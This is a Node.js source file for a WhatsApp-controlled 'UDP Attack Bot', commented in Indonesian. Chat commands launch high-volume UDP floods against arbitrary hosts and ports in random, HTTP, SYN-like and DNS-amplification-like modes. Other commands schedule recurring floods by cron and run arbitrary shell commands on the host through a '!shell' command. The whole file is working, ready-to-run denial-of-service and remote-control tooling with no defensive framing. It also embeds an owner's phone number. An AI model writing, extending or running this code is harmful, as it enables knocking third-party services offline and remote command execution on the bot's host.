const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys')
const fs = require('fs')
const pino = require('pino')
const readline = require('readline')
const { exec } = require('child_process')
const { createSocket } = require('dgram')
const { randomBytes } = require('crypto')
const dns = require('dns')
const http = require('http')
const https = require('https')
const net = require('net')
const os = require('os')
const cron = require('node-cron')

// Konfigurasi awal
const CONFIG = {
    prefix: '!',
    ownerNumber: '6281280174445', // Ganti dengan nomor Anda tanpa +
    authPath: './auth_info',
    logLevel: 'warn',
    attackDelay: 5, // Delay antar packet dalam ms (lebih rendah = lebih ganas)
    maxThreadsPerAttack: 100000, // Jumlah maksimum thread per serangan
    maxPacketSize: 6555507, // Ukuran maksimum packet UDP (maksimum UDP payload)
    userAgents: [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
    ],
    scheduledAttacks: {}
}

// State aplikasi
const state = {
    attacks: {}, // Menyimpan attacks yang sedang berjalan
    sockets: [], // Menyimpan semua socket yang aktif
    totalPacketsSent: 0,
    totalBytesSent: 0,
    startTime: Date.now(),
    serverInfo: null
}

// Fungsi untuk mendapatkan informasi server
const getServerInfo = () => {
    const interfaces = os.networkInterfaces()
    const cpus = os.cpus()
    
    // Cari IPv4 address yang bukan localhost
    let ipAddress = 'Unknown'
    Object.keys(interfaces).forEach((ifName) => {
        interfaces[ifName].forEach((iface) => {
            if (iface.family === 'IPv4' && !iface.internal) {
                ipAddress = iface.address
            }
        })
    })
    
    return {
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        cpuModel: cpus[0]?.model || 'Unknown',
        cpuCount: cpus.length,
        totalMemory: Math.round(os.totalmem() / (1024 * 1024 * 1024)) + ' GB',
        freeMemory: Math.round(os.freemem() / (1024 * 1024 * 1024)) + ' GB',
        uptime: Math.floor(os.uptime() / 3600) + ' hours',
        ipAddress
    }
}

// Fungsi untuk mengecek status IP target
const checkIpStatus = (target, port = 80) => {
    return new Promise((resolve) => {
        // Coba resolve hostname jika target bukan IP
        dns.lookup(target, (err, address) => {
            if (err) {
                resolve({
                    status: 'error',
                    message: `Tidak dapat resolve hostname: ${err.message}`,
                    ip: null,
                    isUp: false
                })
                return
            }
            
            // Cek koneksi dengan TCP
            const socket = new net.Socket()
            socket.setTimeout(3000) // 3 detik timeout
            
            let isResolved = false
            
            socket.on('connect', () => {
                if (isResolved) return
                socket.destroy()
                isResolved = true
                resolve({
                    status: 'up',
                    message: 'Target hidup dan dapat diakses',
                    ip: address,
                    isUp: true
                })
            })
            
            socket.on('timeout', () => {
                if (isResolved) return
                socket.destroy()
                isResolved = true
                resolve({
                    status: 'timeout',
                    message: 'Koneksi timeout',
                    ip: address,
                    isUp: false
                })
            })
            
            socket.on('error', (err) => {
                if (isResolved) return
                socket.destroy()
                isResolved = true
                
                let statusMessage = 'Target tidak dapat diakses'
                // Handle ECONNREFUSED (port tertutup tapi host up)
                if (err.code === 'ECONNREFUSED') {
                    resolve({
                        status: 'port_closed',
                        message: `Port ${port} tertutup tapi host hidup`,
                        ip: address,
                        isUp: true
                    })
                } else {
                    resolve({
                        status: 'error',
                        message: `${statusMessage}: ${err.message}`,
                        ip: address,
                        isUp: false
                    })
                }
            })
            
            socket.connect(port, address)
        })
    })
}

// Fungsi untuk generate packet payload yang lebih powerful
const generatePayload = (size, target) => {
    // Buat payload random
    const payload = Buffer.alloc(size)
    
    // Tambahkan HTTP header untuk bypass firewall
    const httpHeader = `GET / HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: ${CONFIG.userAgents[Math.floor(Math.random() * CONFIG.userAgents.length)]}\r\nAccept: */*\r\n\r\n`
    
    // Isi payload dengan data random
    randomBytes(size).copy(payload)
    
    // Tambahkan HTTP header di awal payload
    Buffer.from(httpHeader).copy(payload)
    
    return payload
}

// Fungsi untuk membuat bermacam tipe serangan UDP
const createAttackPayload = (type, target, size) => {
    switch (type) {
        case 'random':
            return randomBytes(size)
        
        case 'http':
            return generatePayload(size, target)
        
        case 'syn':
            // Simulasi SYN flood dalam UDP (untuk ilustrasi)
            const synPayload = Buffer.alloc(size)
            // TCP header dengan flag SYN
            Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]).copy(synPayload)
            return synPayload
        
        case 'dns':
            // Simulasi DNS amplification
            const dnsPayload = Buffer.alloc(size)
            // DNS query header
            Buffer.from([0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]).copy(dnsPayload)
            return dnsPayload
        
        default:
            return randomBytes(size)
    }
}

// Fungsi utama untuk melakukan UDP attack
const startUdpAttack = (target, port, duration, size = 1024, threads = 100, type = 'random') => {
    console.log(`[Attack] Memulai serangan UDP ke ${target}:${port} (${duration}s, ${threads} threads, ${size} bytes, type: ${type})`)
    
    const attackId = `${target}:${port}`
    
    // Jika sudah ada serangan ke target yang sama, hentikan dulu
    if (state.attacks[attackId]) {
        stopUdpAttack(target, port)
    }
    
    // Batasi jumlah thread maksimum
    const actualThreads = Math.min(threads, CONFIG.maxThreadsPerAttack)
    
    // Batasi ukuran packet maksimum
    const actualSize = Math.min(size, CONFIG.maxPacketSize)
    
    // Buat socket
    const sockets = []
    for (let i = 0; i < actualThreads; i++) {
        try {
            const socket = createSocket('udp4')
            // Tambahkan error handler untuk mencegah crash
            socket.on('error', (err) => {
                // console.error(`Socket error: ${err.message}`)
            })
            sockets.push(socket)
            state.sockets.push(socket)
        } catch (err) {
            console.error(`Error creating socket: ${err.message}`)
        }
    }
    
    // Generate payload sesuai tipe
    const payload = createAttackPayload(type, target, actualSize)
    
    // Statistik untuk serangan ini
    const attackStats = {
        packetsSent: 0,
        bytesSent: 0,
        startTime: Date.now()
    }
    
    // Buat interval untuk pengiriman
    const intervalId = setInterval(() => {
        for (const socket of sockets) {
            try {
                socket.send(payload, 0, payload.length, port, target, (err) => {
                    if (!err) {
                        attackStats.packetsSent++
                        attackStats.bytesSent += payload.length
                        state.totalPacketsSent++
                        state.totalBytesSent += payload.length
                    }
                })
            } catch (err) {
                // Ignore errors to keep attacking
            }
        }
    }, CONFIG.attackDelay)
    
    // Simpan info serangan
    state.attacks[attackId] = {
        target,
        port,
        intervalId,
        sockets,
        type,
        stats: attackStats,
        duration,
        size: actualSize,
        threads: actualThreads,
        startTime: Date.now()
    }
    
    // Set timeout untuk mengakhiri serangan
    if (duration > 0) {
        setTimeout(() => {
            stopUdpAttack(target, port)
        }, duration * 1000)
    }
    
    return attackId
}

// Fungsi untuk menghentikan serangan
const stopUdpAttack = (target, port) => {
    const attackId = `${target}:${port}`
    const attack = state.attacks[attackId]
    
    if (!attack) {
        return false
    }
    
    clearInterval(attack.intervalId)
    
    for (const socket of attack.sockets) {
        try {
            socket.close()
            const index = state.sockets.indexOf(socket)
            if (index !== -1) {
                state.sockets.splice(index, 1)
            }
        } catch (err) {
            // Ignore errors during cleanup
        }
    }
    
    console.log(`[Attack] Menghentikan serangan UDP ke ${target}:${port}`)
    
    // Hitung statistik akhir
    const elapsedTime = (Date.now() - attack.stats.startTime) / 1000
    console.log(`[Stats] Serangan selesai: ${attack.stats.packetsSent} paket (${Math.round(attack.stats.bytesSent / (1024 * 1024))} MB) dalam ${elapsedTime.toFixed(2)}s`)
    
    delete state.attacks[attackId]
    
    return true
}

// Fungsi untuk menjalankan perintah shell
const runCommand = (command) => {
    return new Promise((resolve, reject) => {
        exec(command, (error, stdout, stderr) => {
            if (error) {
                reject(error)
                return
            }
            resolve(stdout || stderr)
        })
    })
}

// Fungsi untuk menjadwalkan serangan
const scheduleAttack = (cronExpression, target, port, duration, size, threads, type) => {
    try {
        // Validasi cron expression
        if (!cron.validate(cronExpression)) {
            throw new Error('Invalid cron expression')
        }
        
        const id = `${target}:${port}:${Date.now()}`
        
        // Buat jadwal
        const task = cron.schedule(cronExpression, () => {
            console.log(`[Scheduled] Menjalankan serangan terjadwal ke ${target}:${port}`)
            startUdpAttack(target, port, duration, size, threads, type)
        })
        
        // Simpan info jadwal
        CONFIG.scheduledAttacks[id] = {
            id,
            target,
            port,
            duration,
            size,
            threads,
            type,
            cronExpression,
            task,
            createdAt: Date.now()
        }
        
        return id
    } catch (err) {
        console.error(`Error scheduling attack: ${err.message}`)
        throw err
    }
}

// Fungsi untuk membatalkan jadwal serangan
const cancelScheduledAttack = (id) => {
    const scheduledAttack = CONFIG.scheduledAttacks[id]
    
    if (!scheduledAttack) {
        return false
    }
    
    // Hentikan cron job
    scheduledAttack.task.stop()
    
    // Hapus dari daftar
    delete CONFIG.scheduledAttacks[id]
    
    return true
}

// Fungsi untuk meminta pairing code
const requestPairingCode = async (sock) => {
    try {
        const phoneNumber = await new Promise((resolve) => {
            const rl = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            })
            
            rl.question('Masukkan nomor WhatsApp (format: 628xxxxx): ', (input) => {
                rl.close()
                resolve(input)
            })
        })
        
        // Validasi format nomor
        if (!phoneNumber.match(/^\d+$/)) {
            console.log('Nomor telepon hanya boleh berisi angka tanpa spasi atau karakter khusus')
            return await requestPairingCode(sock)
        }
        
        console.log('Meminta kode pairing untuk nomor ' + phoneNumber)
        
        // Mendapatkan kode pairing
        const code = await sock.requestPairingCode(phoneNumber)
        console.log(`\n===================================`)
        console.log(`Kode pairing: ${code}`)
        console.log(`===================================\n`)
        console.log('Masukkan kode di WhatsApp untuk menautkan perangkat')
    } catch (error) {
        console.error('Error saat meminta pairing code:', error)
    }
}

// Handler untuk perintah WhatsApp
const handleCommand = async (sock, msg, command, params) => {
    const sender = msg.key.remoteJid
    const isSenderOwner = sender.includes(CONFIG.ownerNumber)
    
    // Hanya owner yang bisa menggunakan command
    if (!isSenderOwner && command !== 'ping') {
        await sock.sendMessage(sender, { text: '⛔ Anda tidak memiliki akses untuk perintah ini.' }, { quoted: msg })
        return
    }
    
    try {
        switch (command) {
            case 'ping':
                await sock.sendMessage(sender, { text: '🟢 Pong! Bot aktif.' }, { quoted: msg })
                break
                
            case 'attack':
                if (params.length < 3) {
                    await sock.sendMessage(sender, { 
                        text: `⚠️ Penggunaan: !attack <target> <port> <durasi> [ukuran] [threads] [tipe]
                        
Tipe yang tersedia:
- random: Random bytes (default)
- http: HTTP flood dengan header
- syn: SYN-like payload
- dns: DNS amplification-like` 
                    }, { quoted: msg })
                    return
                }
                
                const [target, port, duration, size = 1024, threads = 100, type = 'random'] = params
                
                if (isNaN(port) || isNaN(duration) || isNaN(size) || isNaN(threads)) {
                    await sock.sendMessage(sender, { text: '⚠️ Port, durasi, ukuran, dan threads harus berupa angka.' }, { quoted: msg })
                    return
                }
                
                // Cek status target terlebih dahulu
                await sock.sendMessage(sender, { text: `🔍 Sedang mengecek status target ${target}...` }, { quoted: msg })
                
                const ipStatus = await checkIpStatus(target, parseInt(port))
                let targetInfo = ''
                
                if (ipStatus.ip) {
                    targetInfo = `IP: ${ipStatus.ip}\nStatus: ${ipStatus.status}\n${ipStatus.message}`
                } else {
                    targetInfo = `Status: ${ipStatus.status}\n${ipStatus.message}`
                }
                
                await sock.sendMessage(sender, { text: `📡 Info Target:\n${targetInfo}` }, { quoted: msg })
                
                if (!ipStatus.isUp && type !== 'random') {
                    await sock.sendMessage(sender, { 
                        text: `⚠️ Target tidak terlihat aktif. Tetap lanjutkan serangan?
Balas dengan !confirm untuk melanjutkan atau !cancel untuk membatalkan.` 
                    }, { quoted: msg })
                    
                    // Simpan perintah dalam state untuk konfirmasi
                    state.pendingConfirmation = {
                        command: 'attack',
                        params: [target, parseInt(port), parseInt(duration), parseInt(size), parseInt(threads), type],
                        expiresAt: Date.now() + 60000 // 60 detik
                    }
                    return
                }
                
                // Lanjutkan serangan jika target up atau tipe random
                const attackId = startUdpAttack(target, parseInt(port), parseInt(duration), parseInt(size), parseInt(threads), type)
                
                await sock.sendMessage(sender, { 
                    text: `🚀 Serangan UDP dimulai!
Target: ${target}:${port}
Durasi: ${duration} detik
Ukuran: ${size} bytes
Threads: ${threads}
Tipe: ${type}
ID: ${attackId}` 
                }, { quoted: msg })
                break
                
            case 'confirm':
                if (!state.pendingConfirmation || state.pendingConfirmation.expiresAt < Date.now()) {
                    await sock.sendMessage(sender, { text: '⚠️ Tidak ada konfirmasi yang tertunda atau konfirmasi telah kedaluwarsa.' }, { quoted: msg })
                    return
                }
                
                const pendingCmd = state.pendingConfirmation.command
                const pendingParams = state.pendingConfirmation.params
                
                if (pendingCmd === 'attack') {
                    const [t, p, d, s, th, ty] = pendingParams
                    const attackId = startUdpAttack(t, p, d, s, th, ty)
                    
                    await sock.sendMessage(sender, { 
                        text: `🚀 Serangan UDP dimulai!
Target: ${t}:${p}
Durasi: ${d} detik
Ukuran: ${s} bytes
Threads: ${th}
Tipe: ${ty}
ID: ${attackId}` 
                    }, { quoted: msg })
                }
                
                delete state.pendingConfirmation
                break
                
            case 'cancel':
                if (state.pendingConfirmation) {
                    delete state.pendingConfirmation
                    await sock.sendMessage(sender, { text: '✅ Perintah dibatalkan.' }, { quoted: msg })
                } else {
                    await sock.sendMessage(sender, { text: '⚠️ Tidak ada operasi yang tertunda.' }, { quoted: msg })
                }
                break
                
            case 'stop':
                if (params.length < 2) {
                    await sock.sendMessage(sender, { text: '⚠️ Penggunaan: !stop <target> <port>' }, { quoted: msg })
                    return
                }
                
                const [stopTarget, stopPort] = params
                const stopped = stopUdpAttack(stopTarget, parseInt(stopPort))
                
                if (stopped) {
                    await sock.sendMessage(sender, { text: `✅ Serangan ke ${stopTarget}:${stopPort} dihentikan.` }, { quoted: msg })
                } else {
                    await sock.sendMessage(sender, { text: `⚠️ Tidak ada serangan aktif ke ${stopTarget}:${stopPort}.` }, { quoted: msg })
                }
                break
                
            case 'stopall':
                let count = 0
                for (const attackId in state.attacks) {
                    const [t, p] = attackId.split(':')
                    if (stopUdpAttack(t, parseInt(p))) {
                        count++
                    }
                }
                
                await sock.sendMessage(sender, { text: `✅ ${count} serangan dihentikan.` }, { quoted: msg })
                break
                
            case 'list':
                if (Object.keys(state.attacks).length === 0) {
                    await sock.sendMessage(sender, { text: '📋 Tidak ada serangan aktif.' }, { quoted: msg })
                    return
                }
                
                let listMessage = '📋 Daftar serangan aktif:\n\n'
                for (const attackId in state.attacks) {
                    const attack = state.attacks[attackId]
                    const elapsedTime = Math.floor((Date.now() - attack.startTime) / 1000)
                    const remainingTime = attack.duration - elapsedTime
                    
                    listMessage += `Target: ${attack.target}:${attack.port}\n`
                    listMessage += `Tipe: ${attack.type}\n`
                    listMessage += `Threads: ${attack.threads}\n`
                    listMessage += `Size: ${attack.size} bytes\n`
                    listMessage += `Durasi: ${attack.duration}s\n`
                    listMessage += `Waktu berjalan: ${elapsedTime}s\n`
                    listMessage += `Sisa waktu: ${Math.max(0, remainingTime)}s\n`
                    listMessage += `Paket terkirim: ${attack.stats.packetsSent.toLocaleString()}\n`
                    listMessage += `Data terkirim: ${Math.round(attack.stats.bytesSent / (1024 * 1024))} MB\n\n`
                }
                
                await sock.sendMessage(sender, { text: listMessage }, { quoted: msg })
                break
                
            case 'check':
                if (params.length < 1) {
                    await sock.sendMessage(sender, { text: '⚠️ Penggunaan: !check <target> [port]' }, { quoted: msg })
                    return
                }
                
                const [checkTarget, checkPort = 80] = params
                
                await sock.sendMessage(sender, { text: `🔍 Mengecek status ${checkTarget}:${checkPort}...` }, { quoted: msg })
                
                const status = await checkIpStatus(checkTarget, parseInt(checkPort))
                
                let statusMessage = `📡 Status Target: ${checkTarget}\n\n`
                
                if (status.ip) {
                    statusMessage += `IP: ${status.ip}\n`
                }
                statusMessage += `Status: ${status.status}\n`
                statusMessage += `Message: ${status.message}\n`
                statusMessage += `Hidup: ${status.isUp ? 'Ya' : 'Tidak'}`
                
                await sock.sendMessage(sender, { text: statusMessage }, { quoted: msg })
                break
                
            case 'schedule':
                if (params.length < 6) {
                    await sock.sendMessage(sender, { 
                        text: `⚠️ Penggunaan: !schedule "<cron>" <target> <port> <durasi> <ukuran> <threads> [tipe]
                        
Format Cron:
"* * * * *" = (menit jam hari bulan hari-minggu)
Contoh: "0 12 * * *" = Setiap hari jam 12:00
"*/10 * * * *" = Setiap 10 menit` 
                    }, { quoted: msg })
                    return
                }
                
                // Parse cron pattern (dalam quotes)
                let cronPattern = ''
                let remainingParams = []
                
                // Cek apakah param pertama dalam quotes
                const fullCommand = params.join(' ')
                const cronMatch = fullCommand.match(/"([^"]+)"/)
                
                if (cronMatch) {
                    cronPattern = cronMatch[1]
                    remainingParams = fullCommand.replace(cronMatch[0], '').trim().split(/\s+/)
                } else {
                    await sock.sendMessage(sender, { text: '⚠️ Format cron harus dalam quotes. Contoh: "0 12 * * *"' }, { quoted: msg })
                    return
                }
                
                const [schTarget, schPort, schDuration, schSize, schThreads, schType = 'random'] = remainingParams
                
                try {
                    const scheduleId = scheduleAttack(
                        cronPattern,
                        schTarget,
                        parseInt(schPort),
                        parseInt(schDuration),
                        parseInt(schSize),
                        parseInt(schThreads),
                        schType
                    )
                    
                    await sock.sendMessage(sender, { 
                        text: `⏰ Serangan terjadwal berhasil dibuat!
ID: ${scheduleId}
Target: ${schTarget}:${schPort}
Jadwal: ${cronPattern}
Durasi: ${schDuration} detik
Ukuran: ${schSize} bytes
Threads: ${schThreads}
Tipe: ${schType}`
                    }, { quoted: msg })
                } catch (err) {
                    await sock.sendMessage(sender, { text: `⚠️ Error: ${err.message}` }, { quoted: msg })
                }
                break
                
            case 'schedules':
                const schedules = CONFIG.scheduledAttacks
                
                if (Object.keys(schedules).length === 0) {
                    await sock.sendMessage(sender, { text: '📋 Tidak ada serangan terjadwal.' }, { quoted: msg })
                    return
                }
                
                let scheduleMessage = '📋 Daftar serangan terjadwal:\n\n'
                
                for (const id in schedules) {
                    const schedule = schedules[id]
                    scheduleMessage += `ID: ${id}\n`
                    scheduleMessage += `Target: ${schedule.target}:${schedule.port}\n`
                    scheduleMessage += `Jadwal: ${schedule.cronExpression}\n`
                    scheduleMessage += `Durasi: ${schedule.duration}s\n`
                    scheduleMessage += `Ukuran: ${schedule.size} bytes\n`
                    scheduleMessage += `Threads: ${schedule.threads}\n`
                    scheduleMessage += `Tipe: ${schedule.type}\n\n`
                }
                
                await sock.sendMessage(sender, { text: scheduleMessage }, { quoted: msg })
                break
                
            case 'cancel-schedule':
                if (params.length < 1) {
                    await sock.sendMessage(sender, { text: '⚠️ Penggunaan: !cancel-schedule <id>' }, { quoted: msg })
                    return
                }
                
                const scheduleId = params[0]
                
                if (cancelScheduledAttack(scheduleId)) {
                    await sock.sendMessage(sender, { text: `✅ Serangan terjadwal dengan ID ${scheduleId} dibatalkan.` }, { quoted: msg })
                } else {
                    await sock.sendMessage(sender, { text: `⚠️ Tidak ada serangan terjadwal dengan ID ${scheduleId}.` }, { quoted: msg })
                }
                break
                
            case 'shell':
                if (!isSenderOwner) {
                    await sock.sendMessage(sender, { text: '⛔ Perintah ini hanya untuk owner.' }, { quoted: msg })
                    return
                }
                
                if (params.length === 0) {
                    await sock.sendMessage(sender, { text: '⚠️ Penggunaan: !shell <command>' }, { quoted: msg })
                    return
                }
                
                const shellCommand = params.join(' ')
                try {
                    const result = await runCommand(shellCommand)
                    await sock.sendMessage(sender, { text: `🖥️ Output:\n\n${result || 'Tidak ada output'}` }, { quoted: msg })
                } catch (error) {
                    await sock.sendMessage(sender, { text: `❌ Error: ${error.message}` }, { quoted: msg })
                }
                break
                
            case 'info':
                // Dapatkan informasi server
                if (!state.serverInfo) {
                    state.serverInfo = getServerInfo()
                }
                
                // Hitung uptime
                const botUptime = Math.floor((Date.now() - state.startTime) / 1000)
                const days = Math.floor(botUptime / 86400)
                const hours = Math.floor((botUptime % 86400) / 3600)
                const minutes = Math.floor((botUptime % 3600) / 60)
                const seconds = botUptime % 60
                
                // Hitung traffic total
                const totalMB = Math.round(state.totalBytesSent / (1024 * 1024))
                const totalGB = (totalMB / 1024).toFixed(2)
                
                const infoMessage = `📊 Informasi Bot & Server

🤖 Bot Info:
- Uptime: ${days}d ${hours}h ${minutes}m ${seconds}s
- Total paket terkirim: ${state.totalPacketsSent.toLocaleString()}
- Total traffic: ${totalGB} GB

💻 Server Info:
- Hostname: ${state.serverInfo.hostname}
- Platform: ${state.serverInfo.platform}
- CPU: ${state.serverInfo.cpuModel} (${state.serverInfo.cpuCount} cores)
- Memory: ${state.serverInfo.freeMemory} free / ${state.serverInfo.totalMemory} total
- IP: ${state.serverInfo.ipAddress}

⚔️ Attack Status:
- Serangan aktif: ${Object.keys(state.attacks).length}
- Serangan terjadwal: ${Object.keys(CONFIG.scheduledAttacks).length}`

                await sock.sendMessage(sender, { text: infoMessage }, { quoted: msg })
                break
                
            case 'help':
                const helpMessage = `📚 Daftar Perintah Bot UDP Attack:

⚡ Attack Commands:
!attack <target> <port> <durasi> [ukuran] [threads] [tipe] - Mulai serangan UDP
!stop <target> <port> - Hentikan serangan ke target
!stopall - Hentikan semua serangan aktif
!list - Tampilkan daftar serangan aktif

⏰ Scheduled Attacks:
!schedule "<cron>" <target> <port> <durasi> <ukuran> <threads> [tipe] - Jadwalkan serangan
!schedules - Lihat daftar serangan terjadwal
!cancel-schedule <id> - Batalkan serangan terjadwal

🔍 Tools & Monitoring:
!check <target> [port] - Cek status target
!info - Tampilkan info server dan bot
!ping - Cek status bot

🖥️ System Commands:
!shell <command> - Jalankan perintah shell (owner only)

❓ Misc:
!help - Tampilkan pesan ini

Bantuan tipe serangan:
- random: Random bytes (default)
- http: HTTP flood dengan header
- syn: SYN-like payload
- dns: DNS amplification-like`

                await sock.sendMessage(sender, { text: helpMessage }, { quoted: msg })
                break
                
            default:
                await sock.sendMessage(sender, { text: `⚠️ Perintah tidak dikenal: ${command}\nGunakan !help untuk melihat daftar perintah.` }, { quoted: msg })
        }
    } catch (error) {
        console.error('Error saat menangani command:', error)
        await sock.sendMessage(sender, { text: `❌ Terjadi kesalahan: ${error.message}` }, { quoted: msg })
    }
}

// Fungsi utama untuk menginisialisasi bot WhatsApp
async function startBot() {
    console.log('='.repeat(50))
    console.log('🚀 WhatsApp UDP Attack Bot - Advanced Version')
    console.log('='.repeat(50))
    
    // Inisialisasi auth state
    if (!fs.existsSync(CONFIG.authPath)) {
        fs.mkdirSync(CONFIG.authPath, { recursive: true })
    }
    
    const { state: authState, saveCreds } = await useMultiFileAuthState(CONFIG.authPath)
    
    // Logger
    const logger = pino({ level: CONFIG.logLevel }).child({ level: CONFIG.logLevel })
    
    // Buat socket WhatsApp
    const sock = makeWASocket({
        auth: authState,
        printQRInTerminal: false, // Dimatikan agar tidak menampilkan QR code
        logger,
        browser: ['UDP Attack Bot', 'Chrome', '103.0.5060.114'],
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 10000
    })
    
    // Menyimpan event handler
    const eventHandlers = []
    
    // Handle koneksi
    eventHandlers.push(['connection.update', async (update) => {
        const { connection, lastDisconnect } = update
        
        if (connection === 'open') {
            console.log('✅ Bot terhubung!')
            // Tampilkan informasi server saat terhubung
            state.serverInfo = getServerInfo()
            console.log(`\n📊 Server Info:
- Hostname: ${state.serverInfo.hostname}
- Platform: ${state.serverInfo.platform}
- CPU: ${state.serverInfo.cpuModel} (${state.serverInfo.cpuCount} cores)
- Memory: ${state.serverInfo.freeMemory} free / ${state.serverInfo.totalMemory} total
- IP: ${state.serverInfo.ipAddress}\n`)
        }
        
        if (connection === 'close') {
            // Cek apakah perlu reconnect
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
            
            console.log('Koneksi tertutup karena:', lastDisconnect?.error, 'Mencoba koneksi ulang:', shouldReconnect)
            
            if (shouldReconnect) {
                // Bersihkan event handler
                for (const [event] of eventHandlers) {
                    sock.ev.removeAllListeners(event)
                }
                
                // Bersihkan socket yang aktif
                console.log(`Membersihkan ${state.sockets.length} socket aktif...`)
                for (const socket of state.sockets) {
                    try {
                        socket.close()
                    } catch (err) {
                        // Ignore errors
                    }
                }
                state.sockets = []
                
                // Bersihkan interval
                console.log(`Membersihkan ${Object.keys(state.attacks).length} serangan aktif...`)
                for (const attackId in state.attacks) {
                    clearInterval(state.attacks[attackId].intervalId)
                }
                state.attacks = {}
                
                // Simpan statistik untuk dipertahankan
                const oldStats = {
                    totalPacketsSent: state.totalPacketsSent,
                    totalBytesSent: state.totalBytesSent
                }
                
                // Mulai ulang bot
                setTimeout(() => {
                    console.log('Mencoba menghubungkan kembali...')
                    startBot().then(newSock => {
                        // Restore statistik
                        state.totalPacketsSent = oldStats.totalPacketsSent
                        state.totalBytesSent = oldStats.totalBytesSent
                    }).catch(err => {
                        console.error('Error saat reconnect:', err)
                        process.exit(1)
                    })
                }, 5000)
            } else {
                console.log('Bot keluar, tidak menghubungkan ulang.')
                process.exit(0)
            }
        }
        
        // Langsung minta pairing code jika belum terhubung
        if (connection === 'connecting') {
            console.log('Mencoba menghubungkan ke WhatsApp...')
            setTimeout(async () => {
                // Cek apakah masih dalam status connecting setelah delay
                if (sock.user === undefined) {
                    await requestPairingCode(sock)
                }
            }, 3000) // Tunggu 3 detik sebelum meminta pairing code
        }
    }])
    
    // Handle pesan masuk
    eventHandlers.push(['messages.upsert', async (m) => {
        if (m.type !== 'notify') return
        
        for (const msg of m.messages) {
            try {
                if (!msg.message) continue
                
                const msgType = Object.keys(msg.message)[0]
                let msgText = ''
                
                // Ekstrak teks pesan
                if (msgType === 'conversation') {
                    msgText = msg.message.conversation
                } else if (msgType === 'extendedTextMessage') {
                    msgText = msg.message.extendedTextMessage.text
                } else {
                    continue // Skip jika bukan pesan teks
                }
                
                // Cek apakah pesan adalah command
                if (!msgText.startsWith(CONFIG.prefix)) continue
                
                const cmdParts = msgText.slice(CONFIG.prefix.length).trim().split(/\s+/)
                const command = cmdParts[0].toLowerCase()
                const params = cmdParts.slice(1)
                
                await handleCommand(sock, msg, command, params)
            } catch (error) {
                console.error('Error saat memproses pesan:', error)
            }
        }
    }])
    
    // Handle credential updates
    eventHandlers.push(['creds.update', saveCreds])
    
    // Daftarkan semua event handler
    for (const [event, handler] of eventHandlers) {
        sock.ev.on(event, handler)
    }
    
    // Handle process exit
    process.on('SIGINT', async () => {
        console.log('\nMenghentikan bot...')
        
        // Hentikan semua serangan
        for (const attackId in state.attacks) {
            const [target, port] = attackId.split(':')
            stopUdpAttack(target, parseInt(port))
        }
        
        // Hentikan semua jadwal
        for (const scheduleId in CONFIG.scheduledAttacks) {
            cancelScheduledAttack(scheduleId)
        }
        
        // Bersihkan socket
        for (const socket of state.sockets) {
            try {
                socket.close()
            } catch (err) {
                // Ignore errors
            }
        }
        
        console.log('Bot dihentikan.')
        process.exit(0)
    })
    
    return sock
}

// Mulai bot
console.log('Memulai UDP Attack Bot...')
startBot().catch(err => {
    console.error('Error saat menjalankan bot:', err)
    process.exit(1)
})
